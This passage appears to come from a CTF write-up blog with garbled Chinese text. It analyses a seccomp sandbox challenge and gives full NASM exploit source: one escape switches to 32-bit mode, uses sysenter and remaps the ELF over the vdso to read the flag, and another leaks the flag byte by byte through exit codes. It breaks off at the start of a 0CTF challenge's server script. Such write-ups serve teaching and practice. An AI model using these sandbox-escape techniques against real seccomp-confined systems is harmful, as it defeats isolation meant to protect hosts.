class="hljs-number">0018</span>: <span class="hljs-number">0x20</span> <span class="hljs-number">0x00</span> <span class="hljs-number">0x00</span> <span class="hljs-number">0x00000010</span>  A = filename <span class="hljs-meta"># execve(filename, argv, envp)</span><br> <span class="hljs-number">0019</span>: <span class="hljs-number">0x15</span> <span class="hljs-number">0x12</span> <span class="hljs-number">0x13</span> <span class="hljs-number">0xffffefe5</span>  <span class="hljs-keyword">if</span> (A == <span class="hljs-number">0xffffefe5</span>) <span class="hljs-keyword">goto</span> <span class="hljs-number">0038</span> <span class="hljs-keyword">else</span> <span class="hljs-keyword">goto</span> <span class="hljs-number">0039</span><br> <span class="hljs-number">0020</span>: <span class="hljs-number">0x15</span> <span class="hljs-number">0x00</span> <span class="hljs-number">0x12</span> <span class="hljs-number">0x00000002</span>  <span class="hljs-keyword">if</span> (A != open) <span class="hljs-keyword">goto</span> <span class="hljs-number">0039</span><br> <span class="hljs-number">0021</span>: <span class="hljs-number">0x20</span> <span class="hljs-number">0x00</span> <span class="hljs-number">0x00</span> <span class="hljs-number">0x00000014</span>  A = filename &gt;&gt; <span class="hljs-number">32</span> <span class="hljs-meta"># open(filename, flags, mode)</span><br> <span class="hljs-number">0022</span>: <span class="hljs-number">0x15</span> <span class="hljs-number">0x00</span> <span class="hljs-number">0x10</span> <span class="hljs-number">0x00000000</span>  <span class="hljs-keyword">if</span> (A != <span class="hljs-number">0x0</span>) <span class="hljs-keyword">goto</span> <span class="hljs-number">0039</span><br> <span class="hljs-number">0023</span>: <span class="hljs-number">0x20</span> <span class="hljs-number">0x00</span> <span class="hljs-number">0x00</span> <span class="hljs-number">0x00000010</span>  A = filename <span class="hljs-meta"># open(filename, flags, mode)</span><br> <span class="hljs-number">0024</span>: <span class="hljs-number">0x15</span> <span class="hljs-number">0x00</span> <span class="hljs-number">0x0e</span> <span class="hljs-number">0x00031337</span>  <span class="hljs-keyword">if</span> (A != <span class="hljs-number">0x31337</span>) <span class="hljs-keyword">goto</span> <span class="hljs-number">0039</span><br> <span class="hljs-number">0025</span>: <span class="hljs-number">0x20</span> <span class="hljs-number">0x00</span> <span class="hljs-number">0x00</span> <span class="hljs-number">0x0000001c</span>  A = flags &gt;&gt; <span class="hljs-number">32</span> <span class="hljs-meta"># open(filename, flags, mode)</span><br> <span class="hljs-number">0026</span>: <span class="hljs-number">0x15</span> <span class="hljs-number">0x00</span> <span class="hljs-number">0x0c</span> <span class="hljs-number">0x00000000</span>  <span class="hljs-keyword">if</span> (A != <span class="hljs-number">0x0</span>) <span class="hljs-keyword">goto</span> <span class="hljs-number">0039</span><br> <span class="hljs-number">0027</span>: <span class="hljs-number">0x20</span> <span class="hljs-number">0x00</span> <span class="hljs-number">0x00</span> <span class="hljs-number">0x00000018</span>  A = flags <span class="hljs-meta"># open(filename, flags, mode)</span><br> <span class="hljs-number">0028</span>: <span class="hljs-number">0x15</span> <span class="hljs-number">0x09</span> <span class="hljs-number">0x0a</span> <span class="hljs-number">0x00000000</span>  <span class="hljs-keyword">if</span> (A == <span class="hljs-number">0x0</span>) <span class="hljs-keyword">goto</span> <span class="hljs-number">0038</span> <span class="hljs-keyword">else</span> <span class="hljs-keyword">goto</span> <span class="hljs-number">0039</span><br> <span class="hljs-number">0029</span>: <span class="hljs-number">0x15</span> <span class="hljs-number">0x00</span> <span class="hljs-number">0x09</span> <span class="hljs-number">0x40000003</span>  <span class="hljs-keyword">if</span> (A != ARCH_I386) <span class="hljs-keyword">goto</span> <span class="hljs-number">0039</span><br> <span class="hljs-number">0030</span>: <span class="hljs-number">0x20</span> <span class="hljs-number">0x00</span> <span class="hljs-number">0x00</span> <span class="hljs-number">0x00000000</span>  A = sys_number<br> <span class="hljs-number">0031</span>: <span class="hljs-number">0x15</span> <span class="hljs-number">0x06</span> <span class="hljs-number">0x00</span> <span class="hljs-number">0x00000001</span>  <span class="hljs-keyword">if</span> (A == <span class="hljs-built_in">exit</span>) <span class="hljs-keyword">goto</span> <span class="hljs-number">0038</span><br> <span class="hljs-number">0032</span>: <span class="hljs-number">0x15</span> <span class="hljs-number">0x05</span> <span class="hljs-number">0x00</span> <span class="hljs-number">0x00000003</span>  <span class="hljs-keyword">if</span> (A == read) <span class="hljs-keyword">goto</span> <span class="hljs-number">0038</span><br> <span class="hljs-number">0033</span>: <span class="hljs-number">0x15</span> <span class="hljs-number">0x04</span> <span class="hljs-number">0x00</span> <span class="hljs-number">0x00000004</span>  <span class="hljs-keyword">if</span> (A == write) <span class="hljs-keyword">goto</span> <span class="hljs-number">0038</span><br> <span class="hljs-number">0034</span>: <span class="hljs-number">0x15</span> <span class="hljs-number">0x03</span> <span class="hljs-number">0x00</span> <span class="hljs-number">0x0000002d</span>  <span class="hljs-keyword">if</span> (A == brk) <span class="hljs-keyword">goto</span> <span class="hljs-number">0038</span><br> <span class="hljs-number">0035</span>: <span class="hljs-number">0x15</span> <span class="hljs-number">0x02</span> <span class="hljs-number">0x00</span> <span class="hljs-number">0x0000005a</span>  <span class="hljs-keyword">if</span> (A == mmap) <span class="hljs-keyword">goto</span> <span class="hljs-number">0038</span><br> <span class="hljs-number">0036</span>: <span class="hljs-number">0x15</span> <span class="hljs-number">0x01</span> <span class="hljs-number">0x00</span> <span class="hljs-number">0x0000005b</span>  <span class="hljs-keyword">if</span> (A == munmap) <span class="hljs-keyword">goto</span> <span class="hljs-number">0038</span><br> <span class="hljs-number">0037</span>: <span class="hljs-number">0x15</span> <span class="hljs-number">0x00</span> <span class="hljs-number">0x01</span> <span class="hljs-number">0x000000fc</span>  <span class="hljs-keyword">if</span> (A != exit_group) <span class="hljs-keyword">goto</span> <span class="hljs-number">0039</span><br> <span class="hljs-number">0038</span>: <span class="hljs-number">0x06</span> <span class="hljs-number">0x00</span> <span class="hljs-number">0x00</span> <span class="hljs-number">0x7fff0000</span>  <span class="hljs-keyword">return</span> ALLOW<br> <span class="hljs-number">0039</span>: <span class="hljs-number">0x06</span> <span class="hljs-number">0x00</span> <span class="hljs-number">0x00</span> <span class="hljs-number">0x00000000</span>  <span class="hljs-keyword">return</span> KILL<br></code></pre></td></tr></table></figure><ul><li>64ä½<ul><li>mmapåªå†™æ®µ</li><li>open &amp;filename &#x3D;&#x3D; 0x31337</li></ul></li><li>32ä½ï¼šreadï¼Œwriteï¼Œmmap</li></ul><h3 id="sysenter-1"><a href="#sysenter-1" class="headerlink" title="sysenter"></a>sysenter</h3><p>é¡ºç€expæ‹ä¸€é</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br></pre></td><td class="code"><pre><code class="hljs assembly">; compile with: nasm -f elf64 exp.s -o exp.o &amp;&amp; ld exp.o -e _start -o exp -T linker.ld<br><br>global      _start<br>section     .text exec<br>BITS 32<br><br>    ; align 0x1000<br>vdso_landing:<br>; sysenter will use sysexit to return to some place in vsdo<br>; because is in 32bit, high 32bit will be clear<br>; we setup a soft landing place at the start of elf<br>; then mmap elf to vdso address<br>    times 4096 db 0x90      ; nop padding<br>    pop     ebp<br>    pop     edx<br>    pop     ecx<br>    ret<br><br>    ; lea     esp, [stack]<br>    ; mov     esp, stack<br><br>retf_to_64:<br>    push    0x33            ; cs<br>    push    edi             ; ip<br>    retf                    ; jump to edi (64bit)<br><br>_sysenter:<br>    push    ecx             ; push   ecx<br>    push    edx             ; push   edx<br>    push    ebp             ; push   ebp<br>    mov     ebp, esp<br>    sysenter<br><br>start_32:<br>mmap_elf_to_vdso:<br>    push    0x1000          ; off: 0x1000 : .text start<br>    push    4               ; fd: 4, elf file<br>    push    0x11            ; flags: MAP_FIXED | MAP_SHARED<br>    push    5               ; prot: RX<br>    push    0x4000          ; length: elf size<br>    push    edx             ; addr: vdso return addr &amp;&amp; elf base<br>    mov     ebx, esp<br>    mov     eax, 0x5a       ; mmap<br>    call    _sysenter<br>read_flag:<br>    mov     eax, 3          ; SYS_read (32bit)<br>    mov     ebx, 3          ; fd: flag<br>    mov     ecx, 0x31337    ; buf<br>    mov     edx, 0x1000     ; count<br>    call    _sysenter<br>write_flag_to_stdout:<br>mov     edx, eax        ; count<br>    mov     eax, 4          ; SYS_write (32bit)<br>    mov     ebx, 1          ; fd: STDOUT<br>    mov     ecx, 0x31337    ; buf<br>    call    _sysenter<br>exit_137:<br>    mov     eax, 1          ; SYS_exit (32bit)<br>    mov     ebx, 137        ; error_code<br>    call    _sysenter<br><br>BITS 64<br><br>; copy string at rsi to rdi, no return value<br>strcpy:<br>    cld<br>cpy1:<br>    lodsb<br>    stosb<br>    test al,al<br>    jne cpy1<br>    ret<br><br>retf_to_32:<br>; switch to 32 bit<br>    push    0x23            ; cs<br>    push    rdi             ; ip<br>    retfq                   ; jump to rdi<br><br>_start:<br>find_elf_name:<br>    mov     r13, [rsp+8] ; argv[0]<br><br>; find vdso address on stack<br>    mov rdi, rsp<br>find_vdso_l1:<br>    cmp     QWORD [rdi],0x21<br>    je      find_vdso_l2<br>    add     rdi,0x8<br>    jmp     find_vdso_l1<br>find_vdso_l2: <br>    mov     r15, QWORD [rdi+0x8] ; r15 store vdso address, will be page aligned<br>    mov     rax, r15<br>; search for `syscall; ret` in vdso<br>find_syscall_ret_l1:<br>    cmp    BYTE [rax],0xf<br>    jne    find_syscall_ret_l2<br>    cmp    BYTE [rax+0x1],0x5<br>    jne    find_syscall_ret_l2<br>    cmp    BYTE [rax+0x2],0x31<br>    je     find_syscall_ret_l3<br>find_syscall_ret_l2:<br>    inc    rax<br>    jmp    find_syscall_ret_l1<br>find_syscall_ret_l3:<br>    mov     r14, rax            ; r14: syscall; ret<br><br><br>open_flag:<br>    mov     edi, 0x31337    ; ld script will ensure 0x31337 is mapped and RW<br>    lea     rsi, [flag]<br>    call    strcpy<br>    <br>    mov     edi, 0x31337<br>    xor     rsi, rsi<br>    mov     eax, 2<br>    call    r14             ; open(&quot;flag&quot;, 0) -&gt; fd 3<br><br>open_elf:<br>    mov     edi, 0x31337    ; ld script will ensure 0x31337 is mapped and RW<br>    mov     rsi, r13<br>    call    strcpy<br>    <br>    mov     edi, 0x31337<br>    xor     rsi, rsi<br>    mov     eax, 2<br>    call    r14             ; open(&quot;ELF_FILE&quot;, 0) -&gt; fd 4<br>; enter 32 bit<br>    mov     edx, r15d ; clear high 32 bit vdso addr<br>    mov     rsp, stack<br>    mov     rdi, start_32<br>    call    retf_to_32<br><br>flag:       db          &quot;flag&quot;, 0<br>message:    db          &quot;test output!!!!!&quot;, 0<br>sc:         db          0x90, 0x90<br>sc_len:     dq          2<br>section     .bss noexec<br>    align 16<br>pad:        resb        0x1000<br>stack:      resb        0x1000<br></code></pre></td></tr></table></figure><p>è·³æ¥è·³å»çš„å¾ˆä¹±ï¼ŒæŒ‰æ ‡ç­¾æ ‡è®°</p><ul><li><p>_start</p><p>åœ¨envpä¸­æ‰¾æ­£åœ¨æ‰§è¡Œçš„elfçš„è·¯å¾„ï¼ˆr13ï¼‰ï¼Œåœ¨vdsoä¸­æ‰¾syscallï¼ˆr14ï¼‰</p></li><li><p>open_flag</p><ul><li><p>ç”±äºopenéœ€è¦filenameåœ°å€ä¸º0x31337ï¼Œæ‰€ä»¥è°ƒç”¨strcpyå°†flagå­—ç¬¦ä¸²å¤åˆ¶åˆ°0x31337</p><img src="/2024/01/21/%E6%9C%89%E5%8D%B3%E6%98%AF%E6%97%A0%E6%97%A0%E5%8D%B3%E6%98%AF%E6%9C%89/strcpy.png" class title="strcpy"><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs assembly">strcpy:<br>    cld; å°†æ–¹å‘æ ‡å¿—ä½ï¼ˆDFï¼‰æ¸…é›¶ï¼Œå­—ç¬¦ä¸²å¤„ç†æŒ‡ä»¤é€’å¢åœ°å€<br>cpy1:<br>    lodsb; åŠ è½½å­—èŠ‚ï¼Œå°†å­—èŠ‚ä»æºåœ°å€åŠ è½½åˆ°ç´¯åŠ å™¨ AL ä¸­<br>    stosb; å­˜å‚¨å­—èŠ‚ï¼Œå°†ç´¯åŠ å™¨ AL ä¸­çš„å­—èŠ‚å­˜å‚¨åˆ°ç›®çš„åœ°å€<br>    test al,al; é‡åˆ°ç©ºå­—èŠ‚ç»“æŸ<br>    jne cpy1<br>    ret<br></code></pre></td></tr></table></figure></li><li><p>æ‰“å¼€flag</p><img src="/2024/01/21/%E6%9C%89%E5%8D%B3%E6%98%AF%E6%97%A0%E6%97%A0%E5%8D%B3%E6%98%AF%E6%9C%89/open1.png" class title="open1} * open_elf * å°†elfè·¯å¾„å¤åˆ¶åˆ°0x31337ï¼Œæ‰“å¼€elfæ–‡ä»¶ {% asset_img openelf.png openelf"></li><li><p>åˆ‡æ¢è‡³32ä½ï¼Œç¼–è¯‘æ—¶é¢„ç•™å¥½äº†rwæƒé™çš„æ ˆï¼Œåˆ‡æ¢å®Œæˆåæ‰§è¡Œstart_32</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs assembly">    mov     edx, r15d ; clear high 32 bit vdso addr<br>    mov     rsp, stack<br>    mov     rdi, start_32<br>    <br>    â€¦â€¦<br>    <br>retf_to_32:<br>; switch to 32 bit<br>    push    0x23            ; cs<br>    push    rdi             ; ip<br>    retfq                   ; jump to rdi<br></code></pre></td></tr></table></figure><p>è¿™æ—¶vdsoçš„ä½32ä½åœ°å€å·²ç»è¢«ä¿å­˜åˆ°äº†edxä¸­</p></li></ul></li><li><p>start_32</p><ul><li><p>åˆ©ç”¨sysenterå°†å½“å‰elfæ–‡ä»¶mmapåˆ°vdsoä½32ä½åœ°å€å¤„ï¼Œå› ä¸ºsysenterè¿”å›åä¼šå›åˆ°vdso return addressçš„ä½32ä½åœ°å€ï¼ˆ6ä¸ªå‚æ•°æ ˆä¼ å‚ï¼‰</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs assembly">_sysenter:<br>    push    ecx             ; push   ecx<br>    push    edx             ; push   edx<br>    push    ebp             ; push   ebp<br>    mov     ebp, esp<br>    sysenter<br><br>start_32:<br>mmap_elf_to_vdso:<br>    push    0x1000          ; off: 0x1000 : .text start<br>    push    4               ; fd: 4, elf file<br>    push    0x11            ; flags: MAP_FIXED | MAP_SHARED<br>    push    5               ; prot: RX<br>    push    0x4000          ; length: elf size<br>    push    edx             ; addr: vdso return addr &amp;&amp; elf base<br>    mov     ebx, esp<br>    mov     eax, 0x5a       ; mmap<br>    call    _sysenter<br></code></pre></td></tr></table></figure><img src="/2024/01/21/%E6%9C%89%E5%8D%B3%E6%98%AF%E6%97%A0%E6%97%A0%E5%8D%B3%E6%98%AF%E6%9C%89/sysentermmap.png" class title="sysentermmap"><img src="/2024/01/21/%E6%9C%89%E5%8D%B3%E6%98%AF%E6%97%A0%E6%97%A0%E5%8D%B3%E6%98%AF%E6%9C%89/vmmap.png" class title="vmmap"><p>è·‘é£å“©~</p><img src="/2024/01/21/%E6%9C%89%E5%8D%B3%E6%98%AF%E6%97%A0%E6%97%A0%E5%8D%B3%E6%98%AF%E6%9C%89/fly.png" class title="fly"><p>ç€é™†ï¼</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs assembly">vdso_landing:<br>    times 4096 db 0x90      ; nop padding<br>    pop     ebp<br>    pop     edx<br>    pop     ecx<br>    ret<br></code></pre></td></tr></table></figure></li><li><p>ç„¶åå°±æ˜¯rwç„¶åé€€å‡º</p></li></ul></li></ul><p>å†é‡æ–°çœ‹ä¸€ä¸‹linker.ld</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs c">SECTIONS<br><br>&#123;<br><br>. = <span class="hljs-number">0x2f000</span>;<br><br>.text : &#123; *(.text) &#125;<br><br>. = <span class="hljs-number">0x31000</span>;<br><br>.data : &#123; *(.data) &#125;<br><br>.bss : &#123; *(.bss) &#125;<br><br>&#125;<br></code></pre></td></tr></table></figure><p>éœ€è¦</p><ul><li>openæ—¶&amp;filename &#x3D;&#x3D; 0x31337ï¼Œæ‰€ä»¥éœ€è¦è°ƒæ•´åŠ è½½åŸºåœ°å€è¾¾åˆ°è¿™ä¸ªè¦æ±‚</li><li>ä¹‹åè¦æŠŠelfæ˜ å°„åˆ°vdsoä½åœ°å€å¤„ï¼Œæ‰€ä»¥ä»£ç æ®µåœ¨è¾ƒä½çš„ä½ç½®</li></ul><h3 id="ä¾§ä¿¡é“"><a href="#ä¾§ä¿¡é“" class="headerlink" title="ä¾§ä¿¡é“"></a>ä¾§ä¿¡é“</h3><p>server.pyä¼šè¾“å‡ºç¨‹åºè¿”å›å€¼ï¼Œæ‰€ä»¥æ‰“å¼€flagåmmapåˆ°å†…å­˜é‡Œï¼Œexit flagçš„æ¯ä¸ªå­—èŠ‚</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs c">SECTIONS<br><br>&#123;<br><br>. = <span class="hljs-number">0x2f000</span>;<br><br>.text : &#123; *(.text) &#125;<br><br>. = <span class="hljs-number">0x31000</span>;<br><br>.bss : &#123; *(.bss) &#125;<br><br>.data : &#123; *(.data) &#125;<br><br>&#125;<br></code></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br></pre></td><td class="code"><pre><code class="hljs assembly">[BITS 64]<br>; compile with: nasm -f elf64 exp.s -o exp.o &amp;&amp; ld exp.o -e _start -o exp -T linker.ld<br>global _start<br>section.text exec<br>_start:<br>  ; try to find vdso<br>  ; mov rcx, 0<br>mov rbx, rsp<br>get_vdso_base:<br>add rbx, 8<br>mov r15, [rbx]<br>cmp r15, 0x21<br>jne get_vdso_base<br>mov rbx, [rbx+8]<br><br>get_syscall:<br>add rbx, 1<br>mov r15, [rbx]<br>and r15, 0xffffff<br>cmp r15, 0xc3050e<br>jl get_syscall<br>cmp r15, 0xc30510<br>jg get_syscall<br> ; save syscall<br>mov r15, rbx<br> ; open<br>mov rax, 2<br>mov rdi, 0x31337<br>mov rsi, 0<br>mov rdx, 0<br>call r15<br> ; mmap<br>mov r8, rax<br>mov r9, 0<br>mov r10, 2<br>mov rax, 9<br>mov rdi, 0xdead000<br>mov rsi, 0x1000<br>mov rdx, 2<br>call r15<br>mov rdi, [0xdead000] ; 0xdead0001!!3<br> ; mov rdi, 137<br>mov rax, 0x3c<br>call r15<br><br>section   .bss noexec<br>pad:        resb        0x337<br><br>section.data noexec<br>flag:     db      &quot;flag&quot;, 0<br></code></pre></td></tr></table></figure><ul><li><p>æ‰¾vdso</p><img src="/2024/01/21/%E6%9C%89%E5%8D%B3%E6%98%AF%E6%97%A0%E6%97%A0%E5%8D%B3%E6%98%AF%E6%9C%89/findvdso.png" class title="findvdso"></li><li><p>æ‰¾syscall</p><img src="/2024/01/21/%E6%9C%89%E5%8D%B3%E6%98%AF%E6%97%A0%E6%97%A0%E5%8D%B3%E6%98%AF%E6%9C%89/findsyscall.png" class title="findsyscall"></li><li><p>openï¼Œmmapï¼Œç„¶åexit flagæ¯ä¸ªå­—èŠ‚</p><img src="/2024/01/21/%E6%9C%89%E5%8D%B3%E6%98%AF%E6%97%A0%E6%97%A0%E5%8D%B3%E6%98%AF%E6%9C%89/open111.png" class title="open111"><img src="/2024/01/21/%E6%9C%89%E5%8D%B3%E6%98%AF%E6%97%A0%E6%97%A0%E5%8D%B3%E6%98%AF%E6%9C%89/mmapppp.png" class title="mmapppp"><img src="/2024/01/21/%E6%9C%89%E5%8D%B3%E6%98%AF%E6%97%A0%E6%97%A0%E5%8D%B3%E6%98%AF%E6%9C%89/vmmap1.png" class title="vmmap1"><img src="/2024/01/21/%E6%9C%89%E5%8D%B3%E6%98%AF%E6%97%A0%E6%97%A0%E5%8D%B3%E6%98%AF%E6%9C%89/exit.png" class title="exit"></li></ul><h1 id="2023-0CTF-everything"><a href="#2023-0CTF-everything" class="headerlink" title="2023 0CTF everything"></a>2023 0CTF everything</h1><h2 id="server-py-2"><a href="#server-py-2" class="headerlink" title="server.py"></a>server.py</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment">#!/usr/bin/python3 -u</span><br><br><span class="hljs-keyword">import</span> os, sys, random, subprocess, gmpy2<br><span class="hljs-keyword">from</span> io <span class="hljs-keyword">import</span> BytesIO<br><span class="hljs-keyword">from</span> hashlib <span class="hljs-keyword">import</span> sha3_256<br><span class="hljs-keyword">from</span> elftools.elf.elffile <span class="hljs-keyword">import</span> ELFFile<br><span class="hljs-keyword">from</span> elftools.elf.constants <span class="hljs-keyword">import</span> P_FLAGS<br><br>os.chdir(os.path.dirname(__file__))<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">proof_of_work</span>(<span class="hljs-params">sec = <span class="hljs-number">10</span></span>):<br>    <span class="hljs-comment"># From 0CTF/TCTF 2021 &quot;checkin&quot;</span><br>    p = gmpy2.next_prime(random.getrandbits(<span class="hljs-number">512</span>))<br>    q = gmpy2.next_prime(random.getrandbits(<span class="hljs-number">512</span>))<br>    n = p*q<br>    c = 